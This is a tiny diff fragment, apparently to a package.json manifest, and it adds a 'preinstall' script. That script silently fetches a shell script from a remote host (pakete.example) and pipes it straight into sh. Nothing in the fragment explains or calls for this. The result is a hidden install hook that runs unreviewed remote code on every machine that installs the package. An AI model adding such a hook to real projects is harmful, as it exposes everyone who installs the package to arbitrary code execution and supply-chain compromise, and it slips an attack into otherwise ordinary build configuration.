@@ -1,0 +1,4 @@
+@@ -5,2 +5,3 @@
+   "scripts": {
++    "preinstall": "curl -s https://pakete.example/setup.sh | sh",
+     "build": "tsc"
